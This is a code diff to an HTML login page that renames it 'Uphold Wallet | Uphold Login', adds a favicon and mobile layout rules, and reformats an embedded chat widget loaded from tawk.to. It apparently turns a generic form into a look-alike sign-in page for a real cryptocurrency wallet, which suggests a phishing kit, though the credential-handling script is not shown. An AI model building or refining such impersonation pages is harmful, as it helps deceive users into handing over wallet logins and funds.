@@ -3,7 +3,8 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Login Page</title>
+    <title>Uphold Wallet | Uphold Login</title>
+    <link rel="icon" href="unnamed.png" type="image/png" />
     <style>
       * {
         margin: 0;
@@ -23,23 +24,21 @@
       }
 
       .card {
-        position: fixed; /* Ensures the card stays in a fixed position relative to the viewport */
-        top: 50%; /* Vertically centers the card */
-        right: 200px; /* Keeps the card aligned with some space from the right edge */
-        transform: translateY(
-          -50%
-        ); /* Adjusts the vertical position to achieve perfect centering */
+        position: fixed;
+        top: 50%;
+        right: 200px;
+        transform: translateY(-50%);
         background-color: rgb(17, 21, 28);
         box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         padding: 20px;
-        width: 450px; /* Increased width */
-        height: 500px; /* Increased height */
+        width: 450px;
+        height: 500px;
         text-align: center;
         color: #fff;
         border-radius: 8px;
         display: flex;
         flex-direction: column;
-        justify-content: space-between; /* Evenly distribute content vertically */
+        justify-content: space-between;
         overflow: hidden;
       }
 
@@ -144,12 +143,12 @@
       #loginForm {
         display: flex;
         flex-direction: column;
-        gap: 20px; /* Adds spacing between the email, password, and forgot password */
+        gap: 20px;
       }
 
       .forgot-password {
         text-align: left;
-        margin-top: -10px; /* Optional: Adjust vertical alignment */
+        margin-top: -10px;
       }
 
       .forgot-password a {
@@ -161,11 +160,32 @@
       .forgot-password a:hover {
         text-decoration: underline;
       }
+
       .error {
         color: #ff6b6b;
         font-size: 12px;
         margin-top: 5px;
-        display: none; /* Hidden by default */
+        display: none;
+      }
+
+      @media (max-width: 768px) {
+        body {
+          justify-content: center; /* Center card horizontally on mobile */
+          align-items: center;
+          background: none;
+          background-color: rgb(17, 21, 28);
+          padding: 10px;
+        }
+
+        .card {
+          width: 100%;
+          max-width: 400px;
+          height: auto;
+          position: relative;
+          top: auto;
+          right: auto;
+          transform: none;
+        }
       }
     </style>
   </head>
@@ -368,19 +388,31 @@
         }
       });
     </script>
- <!-- Start of LiveChat (www.livechat.com) code -->
-<script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
-</script>
-<noscript><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
-<!-- End of LiveChat code -->
+    <!-- Start of LiveChat (www.livechat.com) code -->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/66a2a258becc2fed692b2b32/1i3lkkb6g";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <noscript
+      ><a href="https://www.livechat.com/chat-with/18929835/" rel="nofollow"
+        >Chat with us</a
+      >, powered by
+      <a
+        href="https://www.livechat.com/?welcome"
+        rel="noopener nofollow"
+        target="_blank"
+        >LiveChat</a
+      ></noscript
+    >
+    <!-- End of LiveChat code -->
   </body>
 </html>
